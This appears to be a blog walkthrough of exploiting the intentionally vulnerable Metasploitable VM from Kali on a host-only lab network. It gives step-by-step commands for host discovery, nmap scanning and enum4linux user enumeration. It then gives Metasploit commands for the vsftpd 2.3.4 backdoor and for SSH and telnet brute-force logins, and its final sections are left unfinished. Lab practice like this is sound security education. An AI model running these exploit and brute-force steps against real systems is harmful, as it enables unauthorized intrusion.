# 'Sploiting the 'Sploitable

Obviously, keep metasploitable and kali on a host-only virtual network. Don't let script kiddies have access to an intentionally exploitable machine!!

Enable a second network interface and update Kali. There's nothing wrong with skipping this step if you're staying on a host-only network, but it's good to be up to date. Once it's updated, be sure to switch your network adapter back to host-only mode.

## Let's get started!

Before starting anything, we want to find the IP of the machine we want to pwn. Let's use netdiscover

`netdiscover -r 192.168.56.100`
Now we've got a few IP addresses to scan.
Pinging `192.168.56.100` returns nothing, whereas `192.168.56.101` pings back! That gives us, with just 3 possible addresses to choose from, a good idea of our target's address.

Time to get more information on our target. We can use nmap to scan for TCP ports and the services they use.

`nmap -sV -O 192.168.56.101 -p1-65535`
- -sV to check open ports and version information
- -O to try to guess the operating system

[image]
Lots of open ports! This is obviously on purpose. This gives us great information-- we can see what software and version number applies to each port.

## Enumeration for fun and profit
Kali has a wonderful script called enum4linux. This asks the remote Samba service for a list of users.

`enum4linux -U 192.168.56.101`
- -U displays the users

With some grepping and cutting, we can easily isolate a list of users for use later. `enum4linux -U 192.168.56.101 | grep 'user:' | cut -d'[' -f2 | cut -d']' -f1 > users.txt` Keep this file around for later!

### There's a few different ways you can get a shell:

## A) vsftpd (port 21)
Why not work in numerical port order. Boot up the metasploit console (`msfconsole`). With this, we can search for and execute various exploits. Let's look up vsftpd version 2.3.4

`search vsftpd 2.3.4`
[image]
Aha! An excellent backdoor exploit. We're given the namespace to the exploit, which we'll use to execute it.

`use exploit/unix/ftp/vsftpd_234_backdoor` (metasploit supports tab completion!)

Next, we'll set RHOST to our target's IP address. `set rhost 192.168.56.101`

and we'll set our RPORT to 21 to match the port that vsftpd is running on. `set rport 21`

Finally, we execute our attack with a simple `run`.

Press Enter, and you'll have gained access to a remote shell!
[image]

## B) ssh (port 22)
We can employ a similar method try and gain access to port 22. With metasploit still open, we'll use a common ssh login check scanner (https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules/).

`use auxillary/scanner/ssh/ssh_login`

Again, set your rhosts and rport to the corresponding information. (`set rhosts 192.168.56.101` and `set rport 22`)

We'll be using our previous wordlist to attempt to brute force our way in. `set user_file users.txt`.

Additionally, we'll want to `set user_as_pass true`. This might save us some time if our target decided to use the same password as their username.

In order to watch the brute force in action, we'll need to `set verbose true`.

Now a quick `run` should enumerate through the users file, trying each username as its own password.
[image]

Hey, look a that! A few possible logins. Thankfully we didn't have to use a long wordlist.
[image]
Not bad!

## C) telnet (port 23)
`use auxiliary/scanner/telnet/telnet_login`
`set user_as_pass true`
`set user_file users.txt`
`set rhosts 192.168.56.101`
`set rport 23`
`run`

## D) smtp (port 25)


## Now what?
how do I know if I'm a sudoer
## Escalation!!
